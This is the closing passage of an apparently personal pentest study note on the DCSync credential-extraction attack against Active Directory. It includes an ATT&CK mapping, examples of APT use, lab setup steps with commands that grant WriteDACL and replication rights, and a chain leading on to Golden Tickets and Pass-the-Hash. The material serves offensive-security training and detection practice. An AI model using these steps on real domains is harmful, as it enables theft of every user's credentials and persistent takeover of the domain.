| Partial hashes / missing AES keys | Used `-just-dc-ntlm` instead of `-just-dc` | Use `-just-dc` (no `-ntlm` suffix) to get NT hashes + Kerberos keys + cleartext |

***

## 🗺️ MITRE ATT&CK

| Tactic | Technique ID | Sub-technique | Procedure | APT Groups |
|---|---|---|---|---|
| **Credential Access** | [T1003](https://attack.mitre.org/techniques/T1003/) | [.006 — DCSync](https://attack.mitre.org/techniques/T1003/006/) | Use DRSUAPI GetNCChanges to replicate credential data from DC | [APT29](https://attack.mitre.org/groups/G0016/) (Cozy Bear), [FIN6](https://attack.mitre.org/groups/G0037/), [Wizard Spider](https://attack.mitre.org/groups/G0102/) |
| **Persistence** | [T1098](https://attack.mitre.org/techniques/T1098/) | [.xxx — Account Manipulation](https://attack.mitre.org/techniques/T1098/) | Grant DCSync replication rights to a controlled account for persistent access | [APT29](https://attack.mitre.org/groups/G0016/), [FIN7](https://attack.mitre.org/groups/G0046/) |
| **Defense Evasion** | [T1550](https://attack.mitre.org/techniques/T1550/) | [.002 — Pass the Hash](https://attack.mitre.org/techniques/T1550/002/) | Use extracted NT hashes for lateral movement without cracking | Widely used by most APT groups |

> [!tip]+ Real-World APT Usage
> `fas:Lightbulb`
> 1. **APT29 (Cozy Bear / SolarWinds)** — Used DCSync extensively during the SolarWinds supply chain compromise to extract KRBTGT hashes and forge Golden Tickets for persistent access across federated environments
> 2. **Wizard Spider (Ryuk/Conti)** — Standard post-exploitation step after obtaining DA; DCSync → offline cracking → credential reuse across victim networks
> 3. **FIN6** — Used Mimikatz DCSync in POS-targeting campaigns to extract service account credentials for lateral movement to payment processing systems

***

## 🧪 Lab Setup Hints

> [!example]+ Minimal Lab for DCSync Practice
> `ris:Command`
> 1. **DC**: Windows Server 2019/2022 VM — promote to DC for `lab.local`; create 5-10 test users with varied passwords
> 2. **Attacker (Linux)**: Kali/Parrot VM — install Impacket (`pipx install impacket`), NetExec (`pipx install netexec`), bloodyAD
> 3. **Attacker (Windows)**: Windows 10/11 VM domain-joined — download Mimikatz, SharpKatz, PowerView, DSInternals
> 4. **Network**: All VMs on same host-only / NAT network; ensure RPC (135 + 49152-65535) and LDAP (389) are accessible
> 5. **Setup DCSync rights test**: Create a low-priv user `testdcsync`, grant it `WriteDACL` on the domain object via `dsacls`, then practice self-granting DCSync rights
> 6. **Enable auditing**: Configure Advanced Audit Policy on the DC to generate 4662 events so you can see what detection looks like
> 7. *Estimated setup time: 45-60 minutes from scratch; 15 minutes with pre-built snapshots*

> [!tip]+ Quick Lab Commands
> `fas:Lightbulb`
> 1. Create test user: `New-ADUser -Name "svc_backup" -SamAccountName svc_backup -AccountPassword (ConvertTo-SecureString 'Password1' -AsPlainText -Force) -Enabled $true`
> 2. Grant WriteDACL for testing: `Add-DomainObjectAcl -TargetIdentity "DC=lab,DC=local" -PrincipalIdentity testdcsync -Rights WriteDacl`
> 3. Enable 4662 auditing: `auditpol /set /subcategory:"Directory Service Access" /success:enable`
> 4. Verify: Run DCSync → check Event Viewer → Security → filter for Event ID 4662

***

## 🔗 Attack Chain Context

```
[DCSync] ──→ Complete Credential Extraction
         │
         ├──→ 🎫 Extract KRBTGT hash → Golden Ticket (Attack #11) → Permanent DA
         ├──→ 🔑 Extract service account hashes → Silver Tickets (Attack #12)
         ├──→ 🔓 Extract all user hashes → offline cracking → password reuse
         ├──→ 💻 Pass-the-Hash with any extracted hash (Attack #4)
         ├──→ 📋 ACL persistence — grant DCSync rights to low-priv user (Attack #65)
         ├──→ 🔗 Prereqs: GenericAll on Domain Object → self-grant DCSync ACE
         ├──→ 🆚 Compare: NTDS.dit extraction (Attack #39) — requires DC access
         ├──→ 🔄 Related: DCShadow (Attack #38) — write instead of read
         └──→ 💀 Defeated by: audit replication ACEs, monitor 4662, MDI, network detection
```

**DCSync is the standard method for credential extraction** in every AD pentest engagement. It has completely replaced NTDS.dit extraction for most scenarios because it requires no code execution on the DC, leaves no disk artifacts, and can target individual accounts selectively. Combined with a Golden Ticket forged from the extracted KRBTGT hash, DCSync provides the attacker with permanent, undetectable domain access.

***

> ✅ **Attack #37 — DCSync complete.**
